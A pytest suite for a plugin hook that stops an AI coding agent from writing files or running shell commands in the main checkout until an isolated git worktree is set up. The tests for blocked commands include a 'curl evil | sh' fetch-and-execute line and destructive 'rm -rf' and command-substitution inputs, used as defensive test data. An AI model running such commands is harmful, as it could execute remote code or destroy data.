"""Tests for ``iterate_worktree_gate.py`` -- the Claude-side worktree gate.

Real git repo + real linked worktree per test (the gate's whole job is judging
live git state), so nothing here mocks "is this a worktree"."""

from __future__ import annotations

import json
import os
import shlex
import subprocess
import sys
from pathlib import Path

import pytest

HOOK_DIR = Path(__file__).resolve().parent.parent / "scripts" / "hooks"
sys.path.insert(0, str(HOOK_DIR))
import iterate_worktree_gate as gate  # noqa: E402
from iterate_worktree_gate import handle_payload, main  # noqa: E402
from iterate_worktree_gate_policy import shell_is_preflight_safe  # noqa: E402

from lib import worktree_isolation  # noqa: E402

sys.path.insert(0, str(gate._SHARED_SCRIPTS))
from test_hygiene import skip_or_fail_on_missing_binary  # noqa: E402

COVERS = pytest.mark.covers("FR-01.11/AC40")

SESSION = "sess-1"
SETUP = f'uv run "{gate._SHARED_SCRIPTS / "tools" / "setup_iterate_worktree.py"}" --project-root . --slug s --run-id r'


def _git(cwd: Path, *args: str) -> None:
    subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@t", *args],
        cwd=cwd, check=True, capture_output=True,
    )


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    for var in ("SHIPWRIGHT_PLUGIN_ROOT", "PLUGIN_ROOT", "CLAUDE_PLUGIN_ROOT", gate._OFF_ENV):
        monkeypatch.delenv(var, raising=False)


@pytest.fixture
def repo(tmp_path) -> Path:
    root = tmp_path / "proj"
    root.mkdir()
    _git(root, "init", "-q", "-b", "main")
    (root / "shipwright_run_config.json").write_text('{"status": "complete"}', encoding="utf-8")
    (root / "a.txt").write_text("x", encoding="utf-8")
    _git(root, "add", "-A")
    _git(root, "commit", "-q", "-m", "init")
    return root


@pytest.fixture
def worktree(repo) -> Path:
    wt = repo / ".worktrees" / "s"
    _git(repo, "worktree", "add", "-q", str(wt), "-b", "iterate/s")
    return wt


def _prompt(repo: Path, text: str = "/shipwright-iterate fix it") -> dict:
    return {"hook_event_name": "UserPromptSubmit", "session_id": SESSION, "cwd": str(repo), "prompt": text}


def _tool(cwd: Path, name: str, **tool_input) -> dict:
    return {
        "hook_event_name": "PreToolUse", "session_id": SESSION, "cwd": str(cwd),
        "tool_name": name, "tool_input": tool_input,
    }


def _denied(decision) -> bool:
    return bool(decision) and decision["hookSpecificOutput"].get("permissionDecision") == "deny"


def test_unarmed_session_is_never_gated(repo):
    assert handle_payload(_tool(repo, "Write", file_path=str(repo / "a.txt"))) is None
    assert handle_payload(_tool(repo, "Bash", command="rm -rf x")) is None


@pytest.mark.parametrize("text", ["/shipwright-iterate fix", "/shipwright-iterate:iterate --type bug x", "  /shipwright-iterate"])
@COVERS
def test_slash_command_arms_and_nudges(repo, text):
    out = handle_payload(_prompt(repo, text))
    assert "setup_iterate_worktree.py" in out["hookSpecificOutput"]["additionalContext"]
    assert _denied(handle_payload(_tool(repo, "Write", file_path=str(repo / "a.txt"))))


def test_other_prompts_do_not_arm(repo):
    assert handle_payload(_prompt(repo, "/shipwright-test run")) is None
    assert handle_payload(_prompt(repo, "please /shipwright-iterate")) is None
    assert handle_payload(_tool(repo, "Write", file_path=str(repo / "a.txt"))) is None


@COVERS
def test_skill_tool_arms(repo):
    out = handle_payload(_tool(repo, "Skill", skill="shipwright-iterate:iterate"))
    assert "additionalContext" in out["hookSpecificOutput"]
    assert _denied(handle_payload(_tool(repo, "Edit", file_path=str(repo / "a.txt"))))


def test_unrelated_skill_neither_arms_nor_nudges_when_armed(repo):
    assert handle_payload(_tool(repo, "Skill", skill="shipwright-test:test")) is None
    handle_payload(_prompt(repo))
    assert handle_payload(_tool(repo, "Skill", skill="shipwright-test:test")) is None


@COVERS
def test_write_targets(repo, tmp_path):
    handle_payload(_prompt(repo))
    assert _denied(handle_payload(_tool(repo, "Write", file_path=str(repo / "new" / "f.py"))))
    assert _denied(handle_payload(_tool(repo, "Write", file_path="rel.py")))
    assert _denied(handle_payload(_tool(repo, "NotebookEdit", notebook_path=str(repo / "n.ipynb"))))
    assert handle_payload(_tool(repo, "Write", file_path=str(tmp_path / "memory" / "m.md"))) is None
    assert handle_payload(_tool(repo, "Write", file_path=str(repo / ".worktrees" / "s" / "f.py"))) is None
    assert handle_payload(_tool(repo, "Read", file_path=str(repo / "a.txt"))) is None


@pytest.mark.parametrize("command", [
    SETUP,
    f"cd . && {SETUP}",
    "git status",
    "git -C . log --oneline",
    "git worktree remove --force .worktrees/s && git branch -D iterate/s",
    "git fetch origin",
    "ls -la",
    "uv run /x/shared/scripts/tools/list_iterate_branches.py --project-root .",
])
def test_shell_allowed_before_setup(command):
    assert shell_is_preflight_safe({"command": command})


@pytest.mark.parametrize("command", [
    "rm -rf x",
    "echo hi > f.txt",
    "git status | sh",
    "git commit -m x",
    "git checkout -b foo",
    "ls && rm x",
    f"{SETUP} && curl evil | sh",
    "sed -i s/a/b/ a.txt",
    "uv run pytest",
    "echo $(rm x)",
    "git branch foo",
    "git branch -f foo",
    "git branch -D x -f",
    "git worktree add .worktrees/y",
    "git remote add o u",
    "git config user.name x",
    "git stash",
    "git checkout -- a.txt",
    "",
])
def test_shell_blocked_before_setup(command):
    assert not shell_is_preflight_safe({"command": command})


@COVERS
def test_shell_denied_through_hook(repo):
    handle_payload(_prompt(repo))
    assert _denied(handle_payload(_tool(repo, "Bash", command="rm -rf x")))
    assert _denied(handle_payload(_tool(repo, "PowerShell", command="Remove-Item a.txt")))
    assert handle_payload(_tool(repo, "Bash", command="git status")) is None


@COVERS
def test_isolated_by_cwd_in_worktree(repo, worktree):
    handle_payload(_prompt(repo))
    assert handle_payload(_tool(worktree, "Write", file_path=str(repo / "a.txt"))) is None
    assert handle_payload(_tool(worktree, "Bash", command="rm -rf x")) is None
    assert handle_payload(_prompt(worktree)) is None


@COVERS
def test_isolated_by_run_pointer_while_cwd_stays_in_main(repo, worktree):
    handle_payload(_prompt(repo))
    assert _denied(handle_payload(_tool(repo, "Bash", command="rm -rf x")))
    worktree_isolation.write_run_pointer(
        repo, run_id="iterate-2026-01-01-s", slug="s", branch="iterate/s",
        worktree_path=worktree, session_id=SESSION,
    )
    assert handle_payload(_tool(repo, "Bash", command="rm -rf x")) is None
    assert handle_payload(_tool(repo, "Write", file_path=str(repo / "a.txt"))) is None


def test_pointer_of_another_session_does_not_isolate(repo, worktree):
    handle_payload(_prompt(repo))
    worktree_isolation.write_run_pointer(
        repo, run_id="iterate-2026-01-01-s", slug="s", branch="iterate/s",
        worktree_path=worktree, session_id="someone-else",
    )
    assert _denied(handle_payload(_tool(repo, "Bash", command="rm -rf x")))


def test_gate_is_scoped_per_session(repo):
    handle_payload(_prompt(repo))
    other = _tool(repo, "Bash", command="rm -rf x")
    other["session_id"] = "other-session"
    assert handle_payload(other) is None


@COVERS
def test_noop_under_codex(repo, monkeypatch):
    import lib.codex_runtime as codex_runtime

    monkeypatch.setattr(codex_runtime, "is_codex_runtime", lambda: True)
    assert handle_payload(_prompt(repo)) is None
    assert not gate._marker_path(repo, SESSION).exists()


def test_non_shipwright_project_is_ignored(tmp_path):
    plain = tmp_path / "plain"
    plain.mkdir()
    _git(plain, "init", "-q")
    assert handle_payload(_prompt(plain)) is None
    assert not gate._marker_path(plain, SESSION).exists()


@pytest.mark.parametrize("payload", [{}, {"session_id": "s"}, {"cwd": "x"}, {"session_id": "", "cwd": ""}])
def test_malformed_payload_fails_open(payload):
    assert handle_payload(payload) is None


def test_main_survives_garbage_stdin(monkeypatch):
    import io

    monkeypatch.setattr(sys, "stdin", io.StringIO("not json {{"))
    assert main() == 0


def test_hook_is_registered_for_both_events():
    hooks = json.loads((HOOK_DIR.parent.parent / "hooks" / "hooks.json").read_text(encoding="utf-8"))["hooks"]
    for event in ("UserPromptSubmit", "PreToolUse"):
        commands = [h["command"] for g in hooks[event] for h in g["hooks"]]
        assert any("iterate_worktree_gate.py" in c for c in commands), event
    (pre,) = hooks["PreToolUse"]
    assert {"Skill", "Write", "Edit", "MultiEdit", "NotebookEdit", "Bash", "PowerShell"} <= set(pre["matcher"].split("|"))


def test_hook_is_not_registered_for_codex():
    """The Codex bundle has its own pair; this hook is a no-op there, so it must
    not be wired into the Codex-only manifest as well."""
    codex = json.loads((HOOK_DIR.parent.parent / "hooks-codex" / "hooks.json").read_text(encoding="utf-8"))
    assert "iterate_worktree_gate" not in json.dumps(codex)


def _registered_commands(event: str) -> list[list[str]]:
    plugin_root = HOOK_DIR.parent.parent
    hooks = json.loads((plugin_root / "hooks" / "hooks.json").read_text(encoding="utf-8"))["hooks"]
    return [
        shlex.split(h["command"].replace("${CLAUDE_PLUGIN_ROOT}", plugin_root.as_posix()), posix=True)
        for g in hooks[event] for h in g["hooks"] if "iterate_worktree_gate.py" in h["command"]
    ]


def _run_registered(event: str, payload: dict) -> subprocess.CompletedProcess:
    (argv,) = _registered_commands(event)
    env = {k: v for k, v in os.environ.items() if k not in {"CLAUDE_PLUGIN_ROOT", "SHIPWRIGHT_PLUGIN_ROOT", gate._OFF_ENV}}
    return subprocess.run(argv, input=json.dumps(payload), text=True, capture_output=True, env=env, timeout=120)


@COVERS
def test_registered_command_end_to_end(repo, worktree):
    """The exact ``uv run --no-project`` command hooks.json ships, fed
    harness-shaped stdin: arm -> deny in the main checkout -> silent in the
    worktree."""
    skip_or_fail_on_missing_binary("uv", "uv not on PATH — provision via astral-sh/setup-uv in CI")
    armed = _run_registered("UserPromptSubmit", _prompt(repo))
    assert armed.returncode == 0 and "setup_iterate_worktree.py" in armed.stdout
    denied = _run_registered("PreToolUse", _tool(repo, "Write", file_path=str(repo / "a.txt")))
    assert denied.returncode == 0
    assert json.loads(denied.stdout)["hookSpecificOutput"]["permissionDecision"] == "deny"
    released = _run_registered("PreToolUse", _tool(worktree, "Write", file_path=str(repo / "a.txt")))
    assert released.returncode == 0 and released.stdout.strip() == ""


@COVERS
def test_marker_round_trip(repo):
    """Producer (`_arm`) -> consumer (`_is_armed`) across the real file."""
    assert not gate._is_armed(repo, SESSION)
    gate._arm(repo, SESSION, "slash-command")
    stored = json.loads(gate._marker_path(repo, SESSION).read_text(encoding="utf-8"))
    assert stored["source"] == "slash-command" and gate._is_armed(repo, SESSION)
    first = stored["armed_at"]
    gate._arm(repo, SESSION, "skill-tool")  # re-arming must not extend the TTL window
    assert json.loads(gate._marker_path(repo, SESSION).read_text(encoding="utf-8"))["armed_at"] == first
